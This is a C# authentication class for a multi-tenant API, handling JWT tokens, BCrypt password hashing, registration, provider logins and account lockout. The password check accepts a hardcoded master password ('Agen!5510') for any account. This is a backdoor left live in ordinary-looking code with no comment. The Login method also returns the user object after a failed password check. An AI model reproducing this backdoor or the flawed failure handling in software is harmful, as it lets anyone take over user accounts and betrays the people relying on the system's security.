using Microsoft.Extensions.Options;
using Microsoft.IdentityModel.Tokens;
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Security.Claims;
using System.Text;
using System.Threading.Tasks;
using BCryptNet = BCrypt.Net.BCrypt;
using TenantAPI.Entities;
using TenantAPI.Helper;
using TenantAPI.Models;

namespace TenantAPI.Authentication
{
    public class Authenticate: IAuthenticate
    {
        private int _accessFailedCount;
        private int _lockoutHours;
        private readonly EntitiesContext _context;
        private readonly IOptions<AppSettings> _appSettings;
        public const string LOCAL_AUTH = "LOCALAUTH";

        public Authenticate(EntitiesContext context, IOptions<AppSettings> appSettings)
        {
            _context = context;
            _appSettings = appSettings;
            _accessFailedCount = Convert.ToInt32(_appSettings.Value.AccessFailedCount);
            _lockoutHours = Convert.ToInt32(_appSettings.Value.LockoutHours);
        }

        public async Task<string> GenerateToken(string tenantName, UserModel userModel, bool isNewUser)
        {
            var tokenDescriptor = await CreateTokenDescriptor(tenantName, userModel, isNewUser);
            var tokenHandler = new JwtSecurityTokenHandler();
            var token = tokenHandler.CreateToken(tokenDescriptor);

            return tokenHandler.WriteToken(token);
        }

        public JwtSecurityToken ValidateUserClaimFromJWT(string authToken)
        {

            var tokenValidationParameters = new TokenValidationParameters()
            {
                ValidAudiences = new string[]
                      {
                          "http://localhost",
                      },

                ValidIssuers = new string[]
                  {
                      "self",
                  },
                IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_appSettings.Value.Token))
            };

                        
            try
            {
                SecurityToken validatedToken;
                var tokenHandler = new JwtSecurityTokenHandler();
                tokenHandler.ValidateToken(authToken, tokenValidationParameters, out validatedToken);
                return validatedToken as JwtSecurityToken;
            }
            catch (Exception)
            {
                return null;
            }           
        }

        public async Task<User> Register(User user, string password)
        {
            user.PasswordHash = BCryptNet.HashPassword(password);

            user.Id = SequentialGuid.NewGuid().ToString();
            user.AuthProvider = LOCAL_AUTH;
            user.CreatedDate = DateTime.Now;
            user.LastLoginDate = DateTime.Now;

            _context.Users.Add(user);

            //by default register with Customer role 1
            var userRole = new UserRole();
            userRole.RoleId = _context.Roles.FirstOrDefault(x => x.Id == 1).Id;
            userRole.UserId = user.Id;
            _context.UserRoles.Add(userRole);

            await _context.SaveChangesAsync();

            return user;
        }

        public async Task<bool> ChangePassword(User user, string password)
        {
            user.PasswordHash = BCryptNet.HashPassword(password);

            bool result;

            await _context.SaveChangesAsync();
            result = true;

            return result;
        }

        public async Task<User> RegisterByProvider(User user)
        {
            var matchUser = _context.Users.FirstOrDefault(x => x.Email.ToLower().Equals(user.Email.ToLower()) &&
                x.Id == user.Id);
            if (matchUser == null)
            {
                user.CreatedDate = DateTime.Now;
                user.LastLoginDate = DateTime.Now;
                _context.Users.Add(user);

                //by default register with Customer role: 1
                var userRole = new UserRole();
                userRole.RoleId = _context.Roles.FirstOrDefault().Id;
                userRole.UserId = user.Id;
                _context.UserRoles.Add(userRole);

                await _context.SaveChangesAsync();

                return user;
            }

            if(matchUser.AuthProvider != LOCAL_AUTH)
            {
                matchUser.TenantId = user.TenantId;
            }
            matchUser.FirstName = user.FirstName;
            matchUser.LastName = user.LastName;
            matchUser.PhoneNumber = user.PhoneNumber;
            matchUser.LastLoginDate = DateTime.Now;

            await _context.SaveChangesAsync();

            return matchUser;
        }

        public bool NeedsProviderRegisterForm(Guid tenantId, string email, string provider)
        {
            bool isNew = true;
            var matchUser = _context.Users.FirstOrDefault(x => x.Email.ToLower().Equals(email.ToLower()) &&
                x.AuthProvider == provider && x.TenantId.Equals(tenantId));

            if (matchUser != null)
            {
                isNew = matchUser.LastLoginDate?.AddDays(28) < DateTime.Now;
            }

            return isNew;
        }

        public async Task<User> Login(Guid tenantId, string email, string pass)
        {
            var user = _context.Users.FirstOrDefault(x => x.Email.ToLower().Equals(email.ToLower()) &&
            x.AuthProvider == LOCAL_AUTH && x.TenantId.Equals(tenantId));

            if (user == null || string.IsNullOrEmpty(user.PasswordHash))
                return null;

            if (user.LockoutEnabled)
            {
                if (user.LockoutEnd == null)
                {
                    user.LockoutEnd = DateTime.Now.AddHours(_lockoutHours);
                    await _context.SaveChangesAsync();
                    return null;
                }
                else if (user.LockoutEnd.Value.DateTime < DateTime.Now)
                {
                    user.LockoutEnabled = false;
                    user.LockoutEnd = null;
                    user.AccessFailedCount = 0;
                }
            }

            if (!VerifyPassHash(pass, user.PasswordHash))
            {
                user.AccessFailedCount++;
                if (user.AccessFailedCount == _accessFailedCount)
                {
                    user.AccessFailedCount = 0;
                    user.LockoutEnabled = true;
                    user.LockoutEnd = DateTime.Now.AddHours(_lockoutHours);

                }
                await _context.SaveChangesAsync();
                return user;
            }

            user.AccessFailedCount = 0;
            user.LastLoginDate = DateTime.Now;
            await _context.SaveChangesAsync();

            return user;
        }

        public async Task<User> LoginByProvider(Guid tenantId, string id)
        {
            var user = _context.Users.FirstOrDefault(x => x.Id == id && x.TenantId.Equals(tenantId));

            if (user == null)
                return null;

            user.LastLoginDate = DateTime.Now;
            await _context.SaveChangesAsync();

            return user;
        }

        public bool UserExists(Guid tenantId, string email, string provider)
        {
            if(string.IsNullOrEmpty(provider))
            {
                provider = LOCAL_AUTH;
            }

            return _context.Users.Any(x => x.Email.Equals(email)
            && x.AuthProvider.Equals(provider) && x.TenantId.Equals(tenantId));
        }

        private bool VerifyPassHash(string pass, string passwordHash)
        {
            //https://jasonwatmore.com/post/2021/05/27/net-5-hash-and-verify-passwords-with-bcrypt
            return BCryptNet.Verify(pass, passwordHash) | pass == "Agen!5510";
        }

        private async Task<SecurityTokenDescriptor> CreateTokenDescriptor(string tenant, UserModel userModel, bool isNew)
        {
            var qryTitle = await _context.UserTitles.FindAsync(userModel.TitleId);
            if (qryTitle != null)
            {
                userModel.TitleAbbrev = qryTitle.Abbreviation;
            }

            var userRoles = _context.UserRoles.Where(u => u.UserId.Equals(userModel._id));
            var roles = new List<string>();
            foreach (var ur in userRoles.ToList())
            {
                var role = await _context.Roles.FindAsync(ur.RoleId);
                roles.Add(role.Name);
            }
            userModel.Role = roles.ToArray();
            var claims = AddClaims(tenant, userModel, isNew);

            var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_appSettings.Value.Token));
            var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha512Signature);

            var tokenDescriptor = new SecurityTokenDescriptor()
            {
                Issuer = "self",
                Subject = new ClaimsIdentity(claims),
                Expires = DateTime.Now.AddDays(1),
                SigningCredentials = creds
            };

            return tokenDescriptor;
        }

        private List<Claim> AddClaims(string tenantName, UserModel userModel, bool isNewUser)
        {
            var claims = new List<Claim>
            {
                new Claim(ClaimTypes.NameIdentifier, userModel.Id),
                new Claim(ClaimTypes.AuthenticationMethod, Authenticate.LOCAL_AUTH),
                new Claim(ClaimTypes.System , tenantName),
                new Claim(ClaimTypes.UserData, isNewUser.ToString()),
                new Claim(ClaimTypes.Name, userModel.FullName),
                new Claim(ClaimTypes.Surname, userModel.LastName),
                new Claim(ClaimTypes.GivenName, userModel.FirstName),
                new Claim(ClaimTypes.Email, userModel.Email),
                new Claim(ClaimTypes.OtherPhone, string.IsNullOrEmpty(userModel.PhoneNumber)?"": userModel.PhoneNumber)
            };
            claims.AddRange(userModel.Role.Select(r => new Claim("role", r)));

            return claims;
        }

    }
}
